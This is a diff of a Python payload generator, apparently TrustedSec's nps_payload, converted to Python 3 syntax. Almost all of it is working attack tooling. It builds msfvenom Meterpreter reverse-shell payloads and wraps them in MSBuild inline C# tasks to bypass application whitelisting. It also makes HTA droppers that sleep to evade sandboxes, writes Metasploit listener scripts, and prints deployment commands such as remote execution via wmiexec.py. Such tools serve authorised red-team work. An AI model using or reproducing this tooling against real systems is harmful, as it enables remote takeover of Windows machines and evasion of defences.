@@ -5,17 +5,22 @@
 # TrustedSec, LLC
 # https://www.trustedsec.com
 
+from __future__ import print_function
 import os
 import sys
 import netifaces as nic
 import pexpect
-import re
 import base64
 
 listener_ip = "127.0.0.1"
 
 # Configure for auto detection of local IP Address
 local_interface = "eth0"
+
+try:
+    raw_input          # Python 2
+except NameError:
+    raw_input = input  # Python 3
 
 # Enumerate the local IP assigned to "iface"
 def get_local_ip(iface):
@@ -37,11 +42,11 @@ def generate_msfvenom_payload(msf_payload):
   msf_port = raw_input("Enter the listener port: ")
 
   # Generate PSH payload
-  print "\nGenerating PSH Payload..."
+  print("\nGenerating PSH Payload...")
   output = pexpect.run("msfvenom -p %s LHOST=%s LPORT=%s --arch x86 --platform win -f psh -o msf_payload.ps1" % (msf_payload,listener_ip,msf_port))
 
   # Generate resource script
-  print "\nGenerating MSF Resource Script..."
+  print("\nGenerating MSF Resource Script...")
   msf_resource_file = open("msbuild_nps.rc", "a")
   payload_listener = "\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j -z" % (msf_payload, listener_ip, msf_port)
   msf_resource_file.write(payload_listener)
@@ -70,16 +75,16 @@ def generate_msbuild_nps_msf_payload():
   msf_resource_file.close()
 
   # Display options to the user
-  print "\nPayload Selection:"
-  print "\n\t(1)\twindows/meterpreter/reverse_tcp"
-  print "\t(2)\twindows/meterpreter/reverse_http"
-  print "\t(3)\twindows/meterpreter/reverse_https"
-  print "\t(4)\tCustom PS1 Payload"
+  print("\nPayload Selection:")
+  print("\n\t(1)\twindows/meterpreter/reverse_tcp")
+  print("\t(2)\twindows/meterpreter/reverse_http")
+  print("\t(3)\twindows/meterpreter/reverse_https")
+  print("\t(4)\tCustom PS1 Payload")
 
-  options = {1:"windows/meterpreter/reverse_tcp",
-            2:"windows/meterpreter/reverse_http",
-            3:"windows/meterpreter/reverse_https",
-            4:"custom_ps1_payload"
+  options = {1: "windows/meterpreter/reverse_tcp",
+             2: "windows/meterpreter/reverse_http",
+             3: "windows/meterpreter/reverse_https",
+             4: "custom_ps1_payload"
   }
 
   # Generate payload
@@ -128,7 +133,7 @@ def generate_msbuild_nps_msf_payload():
             public override bool Execute()
             {
               string cmd = "%s";
-              
+
                 PowerShell ps = PowerShell.Create();
                 ps.AddScript(Base64Decode(cmd));
 
@@ -165,17 +170,17 @@ def generate_msbuild_nps_msf_payload():
   </UsingTask>
 </Project>""" % psh_payload)
 
-  print "\nMetasploit resource script written to msbuild_nps.rc"
-  print "\nRun \"msfconsole -r msbuild_nps.rc\" to start listener."
-  print "\nPayload written to msbuild_nps.xml"
-  print "\nOptions to deploy:"
-  print "\n1) Copy the file to the target machine and then execute the following command:"
-  print "\n\t%windir%\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe <folder_path_here>\\msbuild_nps.xml"
-  print "\n\t--or--"
-  print "\n2) Use samba to share the file."
-  print "\n\ta) Copy the msbuild_nps.xml file to a local samba share (ie: /var/samba/payload$)"
-  print "\tb) Execute the command remotely with the following command:"
-  print "\n\twmiexec.py <USER>:'<PASS>'@<RHOST> cmd.exe /c start %%windir%%\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\msbuild.exe \\\\\\\\%s\\\\payloads$\\\\msbuild_nps.xml" % listener_ip
+  print("\nMetasploit resource script written to msbuild_nps.rc")
+  print("\nRun \"msfconsole -r msbuild_nps.rc\" to start listener.")
+  print("\nPayload written to msbuild_nps.xml")
+  print("\nOptions to deploy:")
+  print("\n1) Copy the file to the target machine and then execute the following command:")
+  print("\n\t%windir%\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe <folder_path_here>\\msbuild_nps.xml")
+  print("\n\t--or--")
+  print("\n2) Use samba to share the file.")
+  print("\n\ta) Copy the msbuild_nps.xml file to a local samba share (ie: /var/samba/payload$)")
+  print("\tb) Execute the command remotely with the following command:")
+  print("\n\twmiexec.py <USER>:'<PASS>'@<RHOST> cmd.exe /c start %%windir%%\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\msbuild.exe \\\\\\\\%s\\\\payloads$\\\\msbuild_nps.xml" % listener_ip)
 
   sys.exit(0)
 
@@ -186,7 +191,6 @@ def generate_msbuild_nps_msf_hta_payload():
   psh_payload = ""
   psh_payloads = ""
   payload_count = 1
-  payload_listener = ""
 
 
   # Delete old resource script
@@ -200,18 +204,18 @@ def generate_msbuild_nps_msf_hta_payload():
 
   while True:
     # Display options to the user
-    print "\nPayload Selection:"
-    print "\n\t(1)\twindows/meterpreter/reverse_tcp"
-    print "\t(2)\twindows/meterpreter/reverse_http"
-    print "\t(3)\twindows/meterpreter/reverse_https"
-    print "\t(4)\tCustom PS1 Payload"
-    print "\t(99)\tFinished"
+    print("\nPayload Selection:")
+    print("\n\t(1)\twindows/meterpreter/reverse_tcp")
+    print("\t(2)\twindows/meterpreter/reverse_http")
+    print("\t(3)\twindows/meterpreter/reverse_https")
+    print("\t(4)\tCustom PS1 Payload")
+    print("\t(99)\tFinished")
 
-    options = {1:"windows/meterpreter/reverse_tcp",
-              2:"windows/meterpreter/reverse_http",
-              3:"windows/meterpreter/reverse_https",
-              4:"custom_ps1_payload",
-              99:"finished"
+    options = {1: "windows/meterpreter/reverse_tcp",
+               2: "windows/meterpreter/reverse_http",
+               3: "windows/meterpreter/reverse_https",
+               4: "custom_ps1_payload",
+               99: "finished"
     }
 
     # Generate payloads
@@ -248,7 +252,7 @@ def generate_msbuild_nps_msf_hta_payload():
   objWindir = objShell.ExpandEnvironmentStrings("%%windir%%")
   Set objWMIService = GetObject("winmgmts:\\\\.\\root\CIMV2")
   arrUnicorns = Array(%s)
-  
+
   ' Get logical processor count
   Set colComputerSystem = objWMIService.ExecQuery("SELECT * FROM Win32_ComputerSystem")
   For Each objComputerSystem In colComputerSystem
@@ -261,17 +265,17 @@ def generate_msbuild_nps_msf_hta_payload():
     ' Sleep 60 seconds
     ' https://www.sans.org/reading-room/whitepapers/malicious/sleeping-sandbox-35797
     objShell.Run "%%COMSPEC%% /c ping -n 60 127.0.0.1>nul", 0, 1
-    
+
     For Each objUnicorn in arrUnicorns
       x = x + 1
-      
+
       ' Create MSBuild XML File
       CreateMSBuildXML objUnicorn, x
-      
+
       ' Execute resource(x).xml using msbuild.exe and nps
       objShell.Run objWindir & "\Microsoft.NET\Framework\\v4.0.30319\msbuild.exe %%TEMP%%\\resource" & x & ".xml", 0
-    Next    
-  
+    Next
+
     ' Cleanup
     For y = 1 To x
       Do While objFSO.FileExists(objTemp & "\\resource" & y & ".xml")
@@ -280,87 +284,87 @@ def generate_msbuild_nps_msf_hta_payload():
       Loop
     Next
   End If
-    
+
   window.close()
 
   ' Creates XML configuration files in the %%TEMP%% directory
   Function CreateMSBuildXML(objUnicorn, x)
-    msbuildXML = "<Project ToolsVersion=" & CHR(34) & "4.0" & CHR(34) & " xmlns=" & CHR(34) & "http://schemas.microsoft.com/developer/msbuild/2003" & CHR(34) & ">" & vbCrLf &_ 
-    "  <!-- This inline task executes c# code. -->" & vbCrLf &_ 
-    "  <!-- C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\msbuild.exe nps.xml -->" & vbCrLf &_ 
-    "  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->" & vbCrLf &_ 
-    "  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->" & vbCrLf &_ 
-    "  <!-- License: BSD 3-Clause -->" & vbCrLf &_ 
-    "  <Target Name=" & CHR(34) & "npscsharp" & CHR(34) & ">" & vbCrLf &_ 
-    "   <nps />" & vbCrLf &_ 
-    "  </Target>" & vbCrLf &_ 
-    "  <UsingTask" & vbCrLf &_ 
-    "    TaskName=" & CHR(34) & "nps" & CHR(34) & "" & vbCrLf &_ 
-    "    TaskFactory=" & CHR(34) & "CodeTaskFactory" & CHR(34) & "" & vbCrLf &_ 
-    "    AssemblyFile=" & CHR(34) & "C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" & CHR(34) & " >" & vbCrLf &_ 
-    "  <Task>" & vbCrLf &_ 
-    "    <Reference Include=" & CHR(34) & "System.Management.Automation" & CHR(34) & " />" & vbCrLf &_ 
-    "      <Code Type=" & CHR(34) & "Class" & CHR(34) & " Language=" & CHR(34) & "cs" & CHR(34) & ">" & vbCrLf &_ 
-    "        <![CDATA[" & vbCrLf &_ 
-    "" & vbCrLf &_ 
-    "          using System;" & vbCrLf &_ 
-    "      using System.Collections.ObjectModel;" & vbCrLf &_ 
-    "      using System.Management.Automation;" & vbCrLf &_ 
-    "      using System.Management.Automation.Runspaces;" & vbCrLf &_ 
-    "      using Microsoft.Build.Framework;" & vbCrLf &_ 
-    "      using Microsoft.Build.Utilities;" & vbCrLf &_ 
-    "" & vbCrLf &_ 
-    "      public class nps : Task, ITask" & vbCrLf &_ 
-    "        {" & vbCrLf &_ 
-    "            public override bool Execute()" & vbCrLf &_ 
-    "            {" & vbCrLf &_ 
-    "              string cmd = " & CHR(34) & objUnicorn & CHR(34) & ";" & vbCrLf &_ 
-    "              " & vbCrLf &_ 
-    "                PowerShell ps = PowerShell.Create();" & vbCrLf &_ 
-    "                ps.AddScript(Base64Decode(cmd));" & vbCrLf &_ 
-    "" & vbCrLf &_ 
-    "                Collection<PSObject> output = null;" & vbCrLf &_ 
-    "                try" & vbCrLf &_ 
-    "                {" & vbCrLf &_ 
-    "                    output = ps.Invoke();" & vbCrLf &_ 
-    "                }" & vbCrLf &_ 
-    "                catch(Exception e)" & vbCrLf &_ 
-    "                {" & vbCrLf &_ 
-    "                    Console.WriteLine(" & CHR(34) & "Error while executing the script.\\r\\n" & CHR(34) & " + e.Message.ToString());" & vbCrLf &_ 
-    "                }" & vbCrLf &_ 
-    "                if (output != null)" & vbCrLf &_ 
-    "                {" & vbCrLf &_ 
-    "                    foreach (PSObject rtnItem in output)" & vbCrLf &_ 
-    "                    {" & vbCrLf &_ 
-    "                        Console.WriteLine(rtnItem.ToString());" & vbCrLf &_ 
-    "                    }" & vbCrLf &_ 
-    "                }" & vbCrLf &_ 
-    "                return true;" & vbCrLf &_ 
-    "            }" & vbCrLf &_ 
-    "" & vbCrLf &_ 
-    "            public static string Base64Encode(string text) {" & vbCrLf &_ 
-    "           return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));" & vbCrLf &_ 
-    "        }" & vbCrLf &_ 
-    "" & vbCrLf &_ 
-    "        public static string Base64Decode(string encodedtext) {" & vbCrLf &_ 
-    "            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));" & vbCrLf &_ 
-    "        }" & vbCrLf &_ 
-    "        }" & vbCrLf &_ 
-    "        ]]>" & vbCrLf &_ 
-    "      </Code>" & vbCrLf &_ 
-    "    </Task>" & vbCrLf &_ 
-    "  </UsingTask>" & vbCrLf &_ 
+    msbuildXML = "<Project ToolsVersion=" & CHR(34) & "4.0" & CHR(34) & " xmlns=" & CHR(34) & "http://schemas.microsoft.com/developer/msbuild/2003" & CHR(34) & ">" & vbCrLf &_
+    "  <!-- This inline task executes c# code. -->" & vbCrLf &_
+    "  <!-- C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\msbuild.exe nps.xml -->" & vbCrLf &_
+    "  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->" & vbCrLf &_
+    "  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->" & vbCrLf &_
+    "  <!-- License: BSD 3-Clause -->" & vbCrLf &_
+    "  <Target Name=" & CHR(34) & "npscsharp" & CHR(34) & ">" & vbCrLf &_
+    "   <nps />" & vbCrLf &_
+    "  </Target>" & vbCrLf &_
+    "  <UsingTask" & vbCrLf &_
+    "    TaskName=" & CHR(34) & "nps" & CHR(34) & "" & vbCrLf &_
+    "    TaskFactory=" & CHR(34) & "CodeTaskFactory" & CHR(34) & "" & vbCrLf &_
+    "    AssemblyFile=" & CHR(34) & "C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" & CHR(34) & " >" & vbCrLf &_
+    "  <Task>" & vbCrLf &_
+    "    <Reference Include=" & CHR(34) & "System.Management.Automation" & CHR(34) & " />" & vbCrLf &_
+    "      <Code Type=" & CHR(34) & "Class" & CHR(34) & " Language=" & CHR(34) & "cs" & CHR(34) & ">" & vbCrLf &_
+    "        <![CDATA[" & vbCrLf &_
+    "" & vbCrLf &_
+    "          using System;" & vbCrLf &_
+    "      using System.Collections.ObjectModel;" & vbCrLf &_
+    "      using System.Management.Automation;" & vbCrLf &_
+    "      using System.Management.Automation.Runspaces;" & vbCrLf &_
+    "      using Microsoft.Build.Framework;" & vbCrLf &_
+    "      using Microsoft.Build.Utilities;" & vbCrLf &_
+    "" & vbCrLf &_
+    "      public class nps : Task, ITask" & vbCrLf &_
+    "        {" & vbCrLf &_
+    "            public override bool Execute()" & vbCrLf &_
+    "            {" & vbCrLf &_
+    "              string cmd = " & CHR(34) & objUnicorn & CHR(34) & ";" & vbCrLf &_
+    "              " & vbCrLf &_
+    "                PowerShell ps = PowerShell.Create();" & vbCrLf &_
+    "                ps.AddScript(Base64Decode(cmd));" & vbCrLf &_
+    "" & vbCrLf &_
+    "                Collection<PSObject> output = null;" & vbCrLf &_
+    "                try" & vbCrLf &_
+    "                {" & vbCrLf &_
+    "                    output = ps.Invoke();" & vbCrLf &_
+    "                }" & vbCrLf &_
+    "                catch(Exception e)" & vbCrLf &_
+    "                {" & vbCrLf &_
+    "                    Console.WriteLine(" & CHR(34) & "Error while executing the script.\\r\\n" & CHR(34) & " + e.Message.ToString());" & vbCrLf &_
+    "                }" & vbCrLf &_
+    "                if (output != null)" & vbCrLf &_
+    "                {" & vbCrLf &_
+    "                    foreach (PSObject rtnItem in output)" & vbCrLf &_
+    "                    {" & vbCrLf &_
+    "                        Console.WriteLine(rtnItem.ToString());" & vbCrLf &_
+    "                    }" & vbCrLf &_
+    "                }" & vbCrLf &_
+    "                return true;" & vbCrLf &_
+    "            }" & vbCrLf &_
+    "" & vbCrLf &_
+    "            public static string Base64Encode(string text) {" & vbCrLf &_
+    "           return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));" & vbCrLf &_
+    "        }" & vbCrLf &_
+    "" & vbCrLf &_
+    "        public static string Base64Decode(string encodedtext) {" & vbCrLf &_
+    "            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));" & vbCrLf &_
+    "        }" & vbCrLf &_
+    "        }" & vbCrLf &_
+    "        ]]>" & vbCrLf &_
+    "      </Code>" & vbCrLf &_
+    "    </Task>" & vbCrLf &_
+    "  </UsingTask>" & vbCrLf &_
     "</Project>"
     Set objFile = objFSO.CreateTextFile(objTemp & "\\resource" & x & ".xml", True)
     objFile.WriteLine(msbuildXML)
     objFile.Close
-  End Function  
+  End Function
 </script>""" % psh_payloads)
 
-  print "\nMetasploit resource script written to msbuild_nps.rc"
-  print "\nRun \"msfconsole -r msbuild_nps.rc\" to start listener."
-  print "\nPayload written to msbuild_nps.hta."
-  print "\n(Hint: Remove comments before deploying)"
+  print("\nMetasploit resource script written to msbuild_nps.rc")
+  print("\nRun \"msfconsole -r msbuild_nps.rc\" to start listener.")
+  print("\nPayload written to msbuild_nps.hta.")
+  print("\n(Hint: Remove comments before deploying)")
 
   sys.exit()
 
@@ -371,34 +375,35 @@ def quit():
 
 # Main guts
 def main():
-  print """                                                        
-                                     (            (     
-                              ) (    )\        )  )\ )  
-  (    `  )  (       `  )  ( /( )\ )((_)(   ( /( (()/(  
-  )\ ) /(/(  )\      /(/(  )(_)|()/( _  )\  )(_)) ((_)) 
- _(_/(((_)_\((_)    ((_)_\((_)_ )(_)) |((_)((_)_  _| |  
-| ' \)) '_ \|_-<    | '_ \) _` | || | / _ \/ _` / _` |  
-|_||_|| .__//__/____| .__/\__,_|\_, |_\___/\__,_\__,_|  
-      |_|     |_____|_|         |__/                    
+  print("""
+                                     (            (
+                              ) (    )\        )  )\ )
+  (    `  )  (       `  )  ( /( )\ )((_)(   ( /( (()/(
+  )\ ) /(/(  )\      /(/(  )(_)|()/( _  )\  )(_)) ((_)
+ _(_/(((_)_\((_)    ((_)_\((_)_ )(_)) |((_)((_)_  _| |
+| ' \)) '_ \|_-<    | '_ \) _` | || | / _ \/ _` / _` |
+|_||_|| .__//__/____| .__/\__,_|\_, |_\___/\__,_\__,_|
+      |_|     |_____|_|         |__/
 
                        v1.02
-"""
+""")
 
   while(1):
     # Display options to the user
-    print "\n\t(1)\tGenerate msbuild/nps/msf payload"
-    print "\t(2)\tGenerate msbuild/nps/msf HTA payload"
-    print "\t(99)\tQuit"
+    print("\n\t(1)\tGenerate msbuild/nps/msf payload")
+    print("\t(2)\tGenerate msbuild/nps/msf HTA payload")
+    print("\t(99)\tQuit")
 
-    options = {1:generate_msbuild_nps_msf_payload,
-              2:generate_msbuild_nps_msf_hta_payload,
-              99:quit,
+    options = {1: generate_msbuild_nps_msf_payload,
+               2: generate_msbuild_nps_msf_hta_payload,
+               99: quit,
     }
     try:
       task = input("\nSelect a task: ")
       options[task]()
     except KeyError:
       pass
+
 
 # Standard boilerplate to call the main() function
 if __name__ == '__main__':
